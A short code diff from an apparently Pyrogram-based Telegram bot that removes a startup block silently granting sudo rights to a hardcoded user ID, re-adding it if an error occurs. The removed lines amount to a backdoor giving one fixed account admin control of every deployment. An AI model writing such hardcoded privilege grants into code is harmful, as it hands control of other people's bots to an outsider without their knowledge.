@@ -43,13 +43,6 @@ bot = Client(
     bot_token=BOT_TOKEN,
     plugins=dict(root="lib.driver"),
 )
-try:
-    add_sudo(int(1317936398))
-    LOGGER.info("Sudo User Added!")
-except Exception as e:
-    del_sudo(int(1317936398))
-    add_sudo(int(1317936398))
-    print(e)
 
 LOGGER.info("Starting bot...")
 bot.start()
